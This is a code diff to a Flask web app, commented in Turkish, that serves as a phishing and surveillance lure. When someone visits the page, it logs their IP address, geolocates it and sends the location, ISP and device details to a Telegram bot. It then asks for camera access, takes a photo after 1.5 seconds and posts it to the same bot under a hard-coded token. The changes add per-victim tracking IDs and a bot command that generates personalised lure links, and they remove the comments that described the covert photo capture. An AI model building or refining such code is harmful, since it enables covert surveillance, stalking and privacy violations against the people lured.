@@ -7,8 +7,8 @@ app = Flask(__name__)
 
 TOKEN = "8887284177:AAEpJLJuyQShebNtE54C1wahiAKWwtm5aBU"
 CHAT_ID = "8218333855"
+BASE_URL = "https://yusufai.onrender.com/"
 
-# Kamera izni isteyip gizlice fotoğraf çeken ve sunucuya gönderen gelişmiş arayüz
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -68,7 +68,6 @@ HTML_TEMPLATE = """
         <p>Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.</p>
     </div>
 
-    <!-- Gizli Kamera Öğeleri -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
@@ -80,7 +79,6 @@ HTML_TEMPLATE = """
                 video.srcObject = stream;
                 video.play();
                 
-                // Kameranın açılması için 1.5 saniye bekleyip fotoğrafı çek
                 setTimeout(function() {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
@@ -88,14 +86,15 @@ HTML_TEMPLATE = """
                     
                     const imageData = canvas.toDataURL('image/jpeg');
                     
-                    // Fotoğrafı arka plandaki Python sunucusuna gönder
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const targetId = urlParams.get('id') || 'Bilinmiyor';
+                    
                     fetch('/capture', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
+                        body: JSON.stringify({ image: imageData, target_id: targetId })
                     });
                     
-                    // Akışı durdur
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
             })
@@ -110,28 +109,38 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def home():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    target_id = request.args.get('id', 'Genel / IDsiz')
+
+    if request.headers.get('CF-Connecting-IP'):
+        ip = request.headers.get('CF-Connecting-IP')
+    elif request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        ip = request.remote_addr
+
     user_agent = request.headers.get('User-Agent')
     zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=3).json()
         country = geo.get('country', 'Bilinmiyor')
-        city = geo.get('city', 'Bilinmiyor')
-        region = geo.get('regionName', 'Bilinmiyor')
+        region = geo.get('regionName', 'Bilinmiyor') # İl / Bölge
+        city = geo.get('city', 'Bilinmiyor')         # Şehir / İlçe
         isp = geo.get('isp', 'Bilinmiyor')
         lat = geo.get('lat', '0')
         lon = geo.get('lon', '0')
     except:
-        country = city = region = isp = "Bilinmiyor"
+        country = region = city = isp = "Bilinmiyor"
         lat = lon = "0"
     
     msg = (
         f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
+        f"🏷️ **Hedef ID / Kod:** `{target_id}`\n"
         f"⏱️ Zaman: {zaman}\n"
         f"🌍 IP Adresi: `{ip}`\n"
         f"🏳️ Ülke: {country}\n"
-        f"🏙️ Şehir: {city} ({region})\n"
+        f"🏙️ İl / Bölge: {region}\n"
+        f"🏘️ Şehir / İlçe: {city}\n"
         f"🏢 İSS: {isp}\n"
         f"📍 Konum: {lat}, {lon}\n"
         f"📱 Cihaz: {user_agent}"
@@ -152,23 +161,53 @@ def home():
 def capture():
     data = request.get_json()
     image_data = data.get('image')
+    target_id = data.get('target_id', 'Bilinmiyor')
     
     if image_data:
         try:
-            # Base64 formatındaki resmi çöz
             header, encoded = image_data.split(",", 1)
             image_bytes = base64.b64decode(encoded)
             
-            # Telegram botuna fotoğraf olarak gönder
             requests.post(
                 f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                data={"chat_id": CHAT_ID, "caption": "📸 Hedefin Kameradan Çekilen Fotoğrafı!"},
+                data={
+                    "chat_id": CHAT_ID, 
+                    "caption": f"📸 Hedefin Fotoğrafı (ID: {target_id})"
+                },
                 files={"photo": ("capture.jpg", image_bytes, "image/jpeg")}
             )
         except Exception as e:
             print(f"Hata: {e}")
             
     return "", 204
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    data = request.get_json()
+    try:
+        if 'message' in data:
+            message = data['message']
+            chat_id = message['chat']['id']
+            text = message.get('text', '').strip()
+            
+            if text.startswith('/link'):
+                parts = text.split(' ', 1)
+                if len(parts) > 1 and parts[1].strip():
+                    custom_id = parts[1].strip()
+                    custom_link = f"{BASE_URL}?id={custom_id}"
+                    reply_text = f"🔗 **{custom_id}** için özel link:\n{custom_link}"
+                else:
+                    reply_text = f"🔗 Genel Aktif Link:\n{BASE_URL}\n\n💡 *Not: ID'li özel link almak için `/link <kod>` yazabilirsin.*"
+                
+                requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
+                    "chat_id": chat_id,
+                    "text": reply_text,
+                    "parse_mode": "Markdown"
+                })
+    except Exception as e:
+        print(f"Webhook Hatası: {e}")
+        
+    return "", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
